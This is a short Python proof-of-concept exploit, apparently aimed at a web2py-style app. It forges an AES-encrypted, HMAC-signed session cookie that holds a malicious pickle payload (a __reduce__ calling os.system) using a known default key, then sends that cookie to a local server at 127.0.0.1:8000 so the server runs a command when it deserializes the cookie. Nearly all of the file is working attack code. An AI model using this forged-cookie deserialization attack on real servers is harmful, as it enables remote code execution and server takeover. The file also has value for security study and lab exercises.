# import pickle
# import base64
# import hmac
# import os
# import threading
# from Crypto.Cipher import AES
# from hashlib import md5, sha1, sha224, sha256, sha384, sha512

# class RCE:
#     def __reduce__(self):
#         import os
#         return os.system, ('ls',)
    
# def pad(s, n=32, padchar=' '):
#     return s + (32 - len(s) % 32) * padchar

# def AES_new(key, IV=None):
#     """ Returns an AES cipher object and random IV if None specified """
#     if IV is None:
#         IV = fast_urandom16()

#     return AES.new(key, AES.MODE_CBC, IV), IV

# def fast_urandom16(urandom=[], locker=threading.RLock()):
#     """
#     This is 4x faster than calling os.urandom(16) and prevents
#     the "too many files open" issue with concurrent access to os.urandom()
#     """
#     try:
#         return urandom.pop()
#     except IndexError:
#         try:
#             locker.acquire()
#             ur = os.urandom(16 * 1024)
#             urandom += [ur[i:i + 16] for i in xrange(16, 1024 * 16, 16)]
#             return ur[0:16]
#         finally:
#             locker.release()

# encryption_key='yoursecret'
# dump = pickle.dumps(RCE(), pickle.HIGHEST_PROTOCOL)
# key=pad(encryption_key)[:32]
# cipher, IV = AES_new(key)
# encrypted_data = base64.urlsafe_b64encode(IV + cipher.encrypt(pad(dump)))
# hash_key = sha1(encryption_key).hexdigest()
# signature = hmac.new(hash_key, encrypted_data).hexdigest()
# cookie = signature + ':' + encrypted_data
# print(cookie)


import requests
url='http://127.0.0.1:8000/examples'
cookie={'session':'e6c8a7268969b905ecbd471001a1f063:67km-XNhEDqIKU6tj7S151Uvu6eIB4NFlTVigLZkOjAqo8iXtnim04fXvpHjwK-e'}
response = requests.get(url,cookies=cookie)
print(response.text)

# data='004b2f04b7150ba43306d5d886e5e002:QzjFysDCM-FvrtB4REmSsNDZAdSM1Dr0yTbZ78tgvFZpJELzUYOQiAMa0BlMMSV0'
# hash_key = sha1(encryption_key).hexdigest()
# signature, encrypted_data = data.split(':', 1)
# actual_signature = hmac.new(hash_key, encrypted_data).hexdigest()
# key = pad(encryption_key)[:32]
# encrypted_data = base64.urlsafe_b64decode(encrypted_data)
# IV, encrypted_data = encrypted_data[:16], encrypted_data[16:]
# cipher, _ = AES_new(key, IV=IV)
# data = cipher.decrypt(encrypted_data)
# data = data.rstrip(' ')
# data=pickle.dumps(RCE())
# print(data)
# pickle.loads(data)